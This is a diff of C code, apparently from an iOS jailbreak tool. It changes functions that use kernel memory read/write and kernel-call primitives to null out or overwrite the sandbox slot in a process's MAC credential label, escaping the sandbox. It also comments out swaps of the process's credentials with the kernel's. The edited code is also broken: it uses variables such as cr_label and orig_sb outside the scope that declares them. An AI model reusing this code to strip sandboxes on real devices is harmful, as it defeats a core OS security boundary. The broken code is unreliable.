@@ -18,18 +18,21 @@
 uint64_t unsandbox(pid_t pid) {
     printf("[*] Unsandboxing pid %d\n", pid);
     
-    uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
-    uint64_t ucred =  get_ucred(proc); // pid credentials
-    uint64_t cr_label = kread64(ucred + off_u_cr_label); // MAC label
-    uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);// not working
+    if(off_p_ucred != 0){
+        uint64_t proc = self_ro; // pid's proccess structure on the kernel
+        uint64_t ucred =  get_ucred(proc); // pid credentials
+        uint64_t cr_label = kread64(ucred + off_u_cr_label); // MAC label
+        uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);// not working
+        kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
+        return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
+    }
     
     printf("[DEBUG] cr_label: 0x%llx\n", cr_label);
     printf("[DEBUG] orig_sb: 0x%llx\n", orig_sb);
     usleep(1000);
     
-    kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
-    
-    return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
+    kcall(off_mac_label_set + get_kslide(), cr_label + off_sandbox_slot, 0, 0, 0, 0, 0, 0);
+    return (kread64(kread64(self_ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
 }
 
 uint64_t run_unsandboxed(void) {
@@ -48,9 +51,9 @@ uint64_t run_unsandboxed(void) {
     uint64_t proc_set_ucred = off_proc_set_ucred;
     proc_set_ucred += get_kslide(); //proc_set_ucred
     printf("[DEBUG] Kernel set_ucred: 0x%llx\n", proc_set_ucred); //func:
-    kwrite64(proc, kern_ucred);
+    //kwrite64(proc, kern_ucred);
     uint64_t ret = unsandbox(pid);
-    kwrite64(proc, self_ucred);
+    //kwrite64(proc, self_ucred);
     return ret;
 }
 
@@ -58,13 +61,16 @@ BOOL sandbox(pid_t pid, uint64_t sb) {
     if (!pid) return NO;
     
     printf("[*] Sandboxing pid %d with slot at 0x%llx\n", pid, sb);
-    
-    uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
-    uint64_t ucred = get_ucred(proc); // pid credentials
-    uint64_t cr_label = kread64(ucred + off_u_cr_label); /* MAC label */
-    kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, sb);
-    
-    return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == sb) ? YES : NO;
+    if(off_p_ucred != 0){
+        uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
+        uint64_t ucred = get_ucred(proc); // pid credentials
+        uint64_t cr_label = kread64(ucred + off_u_cr_label); /* MAC label */
+        kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, sb);
+        return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == sb) ? YES : NO;
+    } else {
+        kcall(off_mac_label_set + get_kslide(), cr_label + off_sandbox_slot, 0, 0, 0, 0, 0, 0);
+        return (kread64(kread64(self_ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
+    }
 }
 
 char* token_by_sandbox_extension_issue_file(const char *extension_class, const char *path, uint32_t flags) {
